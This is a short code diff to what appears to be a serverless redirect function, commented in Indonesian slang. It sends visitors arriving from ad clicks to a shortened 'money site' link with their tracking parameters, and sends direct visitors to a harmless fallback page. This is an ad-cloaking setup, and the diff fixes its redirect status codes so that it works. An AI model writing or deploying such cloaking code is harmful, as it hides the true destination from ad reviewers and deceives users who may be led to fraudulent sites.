@@ -5,7 +5,7 @@ export async function onRequest(context) {
 
   // ====== KONFIG ======
   const MONEY_SITE = "https://t.ly/V1kWU"; // ganti target belajar lo
-  const FALLBACK   = "https://www.google.com/";          // buka manual → ke sini
+  const FALLBACK   = "index.html";          // buka manual → ke sini
   // ====================
 
   // ambil sinyal
@@ -47,7 +47,7 @@ export async function onRequest(context) {
 
   // redirect sesuai keputusan
   if (fromAds) {
-    return Response.redirect(MONEY_SITE + (url.search || ""), 200); // teruskan semua param (utm/gclid/ttclid)
+    return Response.redirect(MONEY_SITE + (url.search || ""), 302); // teruskan semua param (utm/gclid/ttclid)
   }
-  return Response.redirect(FALLBACK, 200);
+  return Response.redirect(FALLBACK, 302);
 }
